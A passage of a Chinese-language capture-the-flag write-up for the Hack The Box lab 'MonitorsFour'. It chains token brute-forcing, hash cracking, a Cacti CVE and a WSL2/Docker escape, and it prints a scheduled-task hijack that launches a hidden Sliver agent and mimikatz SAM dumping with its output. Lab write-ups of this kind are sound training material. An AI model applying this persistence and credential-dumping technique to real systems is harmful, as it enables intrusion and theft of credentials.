+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/MonitorsFour]</span><br><span class="line">└─$ curl [http://monitorsfour.htb/user](http://monitorsfour.htb/user) -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">...</span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Missing token parameter&quot;</span>&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>这个地方需要给出 token，我在这个地方卡了很久，然后听别人说 token 可以爆破<del class="mask">不是哥们 token 还能爆破？</del>，后面就会知道为什么这个地方可以爆破了。</p>
+<p>主打听劝试试爆破 token 去，实在不知道拿啥字典了拿了 rockyou，发现这些 <code>000</code> 的 token 能够显示不同的信息，拿一个看看去。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213013854039.png"
+                      alt="image-20251213013854039"
+                ></p>
+<p>发现了几个 cred：</p>
+<details class="blue" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>点击查看泄露的 JSON 数据 </summary>
+              <div class='content'>
+              <div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl <span class="punctuation">[</span>http<span class="punctuation">:</span><span class="comment">//monitorsfour.htb/user?token=00000](http://monitorsfour.htb/user?token=00000) |jq                                                                [                                               </span></span><br><span class="line">  <span class="punctuation">&#123;</span>                                                                                                      </span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span>                                    </span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span>                        </span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin@monitorsfour.htb&quot;</span><span class="punctuation">,</span>          </span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;56b32eb43e6f15395f6c46c1c9e1cd36&quot;</span><span class="punctuation">,</span>                                                      </span><br><span class="line">    <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;super user&quot;</span><span class="punctuation">,</span>                       </span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9e3572ee066dcbccb4&quot;</span><span class="punctuation">,</span>              </span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Marcus Higgins&quot;</span><span class="punctuation">,</span>                   </span><br><span class="line">    <span class="attr">&quot;position&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Administrator&quot;</span><span class="punctuation">,</span>         </span><br><span class="line">    <span class="attr">&quot;dob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1978-04-26&quot;</span><span class="punctuation">,</span>                        </span><br><span class="line">    <span class="attr">&quot;start_date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2021-01-12&quot;</span><span class="punctuation">,</span>                 </span><br><span class="line">    <span class="attr">&quot;salary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;320800.00&quot;</span>                                                                        </span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span>                                            </span><br><span class="line">  <span class="punctuation">&#123;</span>                                                                                                      </span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span>                                    </span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mwatson&quot;</span><span class="punctuation">,</span>                      </span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mwatson@monitorsfour.htb&quot;</span><span class="punctuation">,</span>        </span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;69196959c16b26ef00b77d82cf6eb169&quot;</span><span class="punctuation">,</span>                                                      </span><br><span class="line">    <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span>                             </span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0e543210987654321&quot;</span><span class="punctuation">,</span>               </span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Michael Watson&quot;</span><span class="punctuation">,</span>                   </span><br><span class="line">    <span class="attr">&quot;position&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Website Administrator&quot;</span><span class="punctuation">,</span>            </span><br><span class="line">    <span class="attr">&quot;dob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1985-02-15&quot;</span><span class="punctuation">,</span>                        </span><br><span class="line">    <span class="attr">&quot;start_date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2021-05-11&quot;</span><span class="punctuation">,</span>                 </span><br><span class="line">    <span class="attr">&quot;salary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;75000.00&quot;</span>                            </span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span>                                                </span><br><span class="line">  <span class="punctuation">&#123;</span>                                                 </span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">6</span><span class="punctuation">,</span>                                        </span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;janderson&quot;</span><span class="punctuation">,</span>                        </span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;janderson@monitorsfour.htb&quot;</span><span class="punctuation">,</span>          </span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2a22dcf99190c322d974c8df5ba3256b&quot;</span><span class="punctuation">,</span>                                                      </span><br><span class="line">    <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span>                                 </span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0e999999999999999&quot;</span><span class="punctuation">,</span>                   </span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jennifer Anderson&quot;</span><span class="punctuation">,</span>                    </span><br><span class="line">    <span class="attr">&quot;position&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Network Engineer&quot;</span><span class="punctuation">,</span>                 </span><br><span class="line">    <span class="attr">&quot;dob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1990-07-16&quot;</span><span class="punctuation">,</span>                            </span><br><span class="line">    <span class="attr">&quot;start_date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2021-06-20&quot;</span><span class="punctuation">,</span>                     </span><br><span class="line">    <span class="attr">&quot;salary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;68000.00&quot;</span>                            </span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span>                                                </span><br><span class="line">  <span class="punctuation">&#123;</span>                                                 </span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">7</span><span class="punctuation">,</span>                                        </span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dthompson&quot;</span><span class="punctuation">,</span>                        </span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dthompson@monitorsfour.htb&quot;</span><span class="punctuation">,</span>          </span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8d4a7e7fd08555133e056d9aacb1e519&quot;</span><span class="punctuation">,</span>                                                      </span><br><span class="line">    <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span>                                 </span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0e111111111111111&quot;</span><span class="punctuation">,</span>                   </span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;David Thompson&quot;</span><span class="punctuation">,</span>                       </span><br><span class="line">    <span class="attr">&quot;position&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Database Manager&quot;</span><span class="punctuation">,</span>                 </span><br><span class="line">    <span class="attr">&quot;dob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1982-11-23&quot;</span><span class="punctuation">,</span>                            </span><br><span class="line">    <span class="attr">&quot;start_date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-09-15&quot;</span><span class="punctuation">,</span>                     </span><br><span class="line">    <span class="attr">&quot;salary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;83000.00&quot;</span>                            </span><br><span class="line">  <span class="punctuation">&#125;</span>                                                 </span><br><span class="line"><span class="punctuation">]</span>                                    </span><br></pre></td></tr></table></figure></div>
+              </div>
+            </details>
+
+<p>最后成功解密出来 <code>56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1</code> 一个密码，正好对应了 admin 的密码，登录 web1 看看有什么去。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213014731655.png"
+                      alt="image-20251213014731655"
+                ></p>
+<p>发现又是一个几乎静态的东西，没有有意思的点，apikey 也不知道应该用在哪。google 说这是一个 admin 的模板页面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213014936530.png"
+                      alt="image-20251213014936530"
+                ></p>
+<p>这个 cred 也无法登录 cacti。但是发现 cacti 在使用存在的用户名登录时候的报错与不存在的用户不同。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213015138206.png"
+                      alt="image-20251213015138206"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213015201222.png"
+                      alt="image-20251213015201222"
+                ></p>
+<p>可以来爆破一下用户名得到 <code>marcus</code> 这个 username。成功登入 cacti，这下可以继续利用 <strong>CVE-2025-24367</strong> 了。</p>
+<h3 id="3-Initial-Foothold-获取立足点"><a href="#3-Initial-Foothold-获取立足点" class="headerlink" title="3. Initial Foothold (获取立足点)"></a>3. Initial Foothold (获取立足点)</h3><h4 id="CVE-2025-24367-Exploitation"><a href="#CVE-2025-24367-Exploitation" class="headerlink" title="CVE-2025-24367 Exploitation"></a>CVE-2025-24367 Exploitation</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213015529056.png"
+                      alt="image-20251213015529056"
+                ></p>
+<p>成功得到 shell，传个 agent 方便操作。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213020305362.png"
+                      alt="image-20251213020305362"
+                ></p>
+<p>收集一下机器的信息，发现这是一个 Windows 的 wsl2 容器。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213020405159.png"
+                      alt="image-20251213020405159"
+                ></p>
+<p>并且在 <code>/home/marcus</code> 目录下可以读到 <code>user.txt</code>。</p>
+<h3 id="4-Privilege-Escalation-权限提升"><a href="#4-Privilege-Escalation-权限提升" class="headerlink" title="4. Privilege Escalation (权限提升)"></a>4. Privilege Escalation (权限提升)</h3><h4 id="Container-Escape"><a href="#Container-Escape" class="headerlink" title="Container Escape"></a>Container Escape</h4><p>用关键词 <code>wsl2 escape docker</code> 去搜索漏洞可以找到这个：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213020701587.png"
+                      alt="image-20251213020701587"
+                ></p>
+<a class="button  regular" target="_blank" rel="noopener" href='https://github.com/xwpdx0/poc-2025-9074' title='WSL2/Docker Escape PoC'><i class='fa-brands fa-github'></i> WSL2/Docker Escape PoC</a>
+
+<p>上传 poc 到靶机，poc 需要一个内网地址，恰好 Gemini 给出来了一个 api 地址 <code>http://192.168.65.7:2375</code>，将这个给到 poc，成功又得到一个反弹 shell。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213021119568.png"
+                      alt="image-20251213021119568"
+                ></p>
+<p>poc 帮我们进入了一个容器，这个容器将靶机的 C 盘挂载到了 <code>hostc</code> 目录下面，从而我们就可以读到 <code>root.txt</code>。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213021320254.png"
+                      alt="image-20251213021320254"
+                ></p>
+<h3 id="5-More-on-this-box-持久化与分析"><a href="#5-More-on-this-box-持久化与分析" class="headerlink" title="5. More on this box (持久化与分析)"></a>5. More on this box (持久化与分析)</h3><h4 id="Interact-Shell"><a href="#Interact-Shell" class="headerlink" title="Interact Shell"></a>Interact Shell</h4><p>虽说是读到了，但是没有拿到交互式 shell 这算打完了吗？</p>
+<p>既然我们对 C 盘拥有完全读写权限的话利用计划任务跑一个我们自己的 agent 就好了。</p>
+<p>Windows 的计划任务文件存放在 <code>/windows/system32/tasks</code> 目录下，正巧这个靶机也确实有几个。</p>
+<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">Clean_Containers</span><br><span class="line">Clean_DB</span><br><span class="line">Copy_User_File_To_Container</span><br><span class="line">Microsoft</span><br><span class="line">StartDockerDesktopCLIOnly</span><br><span class="line">cat Clean_C*</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-16&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Task</span> <span class="attr">version</span>=<span class="string">&quot;1.3&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;[http://schemas.microsoft.com/windows/2004/02/mit/task](http://schemas.microsoft.com/windows/2004/02/mit/task)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">RegistrationInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">URI</span>&gt;</span>\Clean_Containers<span class="tag">&lt;/<span class="name">URI</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">RegistrationInfo</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">  <span class="tag">&lt;<span class="name">Actions</span> <span class="attr">Context</span>=<span class="string">&quot;Author&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Exec</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Command</span>&gt;</span>PowerShell.exe<span class="tag">&lt;/<span class="name">Command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Arguments</span>&gt;</span>-ExecutionPolicy Bypass -File C:\Users\Administrator\Documents\container_cleanup.ps1<span class="tag">&lt;/<span class="name">Arguments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Exec</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Actions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这个任务每三分钟执行一次位于 <code>C:\Users\Administrator\Documents\container_cleanup.ps1</code> 的脚本，直接替换脚本成执行我的 agent。</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt; /hostc/Users/Administrator/Documents/container_cleanup.ps1</span></span><br><span class="line"><span class="string">\$path = &quot;C:\Users\Administrator\Documents\sliver.exe&quot;</span></span><br><span class="line"><span class="string">if (Test-Path \$path) &#123;</span></span><br><span class="line"><span class="string">    Start-Process -FilePath \$path -WindowStyle Hidden</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure></div>
+
+<p>现在静等 3 分钟就能获取到 session 了，然后直接 mimikatz 读到 adminhash。</p>
+<details class="blue" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>点击查看 Mimikatz 输出 </summary>
+              <div class='content'>
+              <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[server] sliver (encsec2) &gt; mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;lsadump::sam&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">  </span><br><span class="line">[*] Successfully executed mimikatz</span><br><span class="line">[*] Got output:  </span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) <span class="comment">#19041 May 17 2024 22:19:06</span></span><br><span class="line"> .## ^ <span class="comment">##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)  </span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) </span></span><br><span class="line"> <span class="comment">## \ / ##  &gt; [https://blog.gentilkiwi.com/mimikatz](https://blog.gentilkiwi.com/mimikatz)</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>  Vincent LE TOUX   ( vincent.letoux@gmail.com )  </span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>   &gt; [https://pingcastle.com](https://pingcastle.com) / [https://mysmartlogon.com](https://mysmartlogon.com) ***/  </span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug </span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK   </span><br><span class="line"> </span><br><span class="line">mimikatz(commandline) <span class="comment"># token::elevate  </span></span><br><span class="line">Token Id  : 0   </span><br><span class="line">User name :</span><br><span class="line">SID name  : NT AUTHORITY\SYSTEM</span><br><span class="line"> </span><br><span class="line">752&#123;0;000003e7&#125; 1 D 48133NT AUTHORITY\SYSTEMS-1-5-18   (04g,21p)  Primary</span><br><span class="line"> -&gt; Impersonated !  </span><br><span class="line"> * Process Token : &#123;0;0037762d&#125; 0 D 3640220MONITORSFOUR\Administrator S-1-5-21-1152179935-589108180-1989892463-500    (15g,24p)  Primary  </span><br><span class="line"> * Thread Token  : &#123;0;000003e7&#125; 1 D 3685606NT AUTHORITY\SYSTEMS-1-5-18   (04g,21p)  Impersonation (Delegation) </span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::sam</span></span><br><span class="line">Domain : MONITORSFOUR    </span><br><span class="line">SysKey : 8a6c03715ce8a8d26720e83ffe01c780   </span><br><span class="line">Local SID : S-1-5-21-1152179935-589108180-1989892463    </span><br><span class="line"></span><br><span class="line">SAMKey : 376138826a6f7dabae201db087e3cc9a</span><br><span class="line"> </span><br><span class="line">RID  : 000001f4 (500)  </span><br><span class="line">User : Administrator </span><br><span class="line">  Hash NTLM: 41f4136faf5a06a6765a8fcea8870225</span><br></pre></td></tr></table></figure></div>
+              </div>
+            </details>
+
+<h4 id="Why-token-0-work"><a href="#Why-token-0-work" class="headerlink" title="Why token&#x3D;0 work?"></a>Why token&#x3D;0 work?</h4><details class="green" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>UserController.php (点击展开查看源码) </summary>
+              <div class='content'>
+              <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/Database.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/AuthController.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="title class_">Database</span>::<span class="title function_ invoke__">getInstance</span>()-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_users</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$token</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Missing token parameter&quot;</span>]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$auth</span> = <span class="keyword">new</span> <span class="title class_">AuthController</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$auth</span>-&gt;<span class="title function_ invoke__">validate_token</span>(<span class="variable">$token</span>)) &#123;       <span class="comment">// 检测token是否合法</span></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid or missing token&quot;</span>]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT * FROM users&quot;</span>);</span><br><span class="line">        <span class="variable">$users</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$users</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_user</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$id</span>    = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$token</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Missing token parameter&quot;</span>]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$id</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Missing ID parameter&quot;</span>]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$auth</span> = <span class="keyword">new</span> <span class="title class_">AuthController</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$auth</span>-&gt;<span class="title function_ invoke__">validate_token</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid or missing token&quot;</span>]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE id = :id&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">            <span 